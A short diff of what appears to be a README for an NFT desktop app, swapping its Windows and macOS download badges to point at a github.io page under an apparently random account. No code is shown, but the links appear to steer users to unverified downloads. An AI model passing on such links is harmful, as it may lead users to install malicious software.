@@ -10,8 +10,8 @@
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://bueno-nft-desktop-app.github.io/.github)  
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/bueno-nft)  
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://lewishesterppqu.github.io/.github/bueno-nft-desktop-app)  
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://lewishesterppqu.github.io/.github/bueno-nft-desktop-app)  
 
 </div>  
 
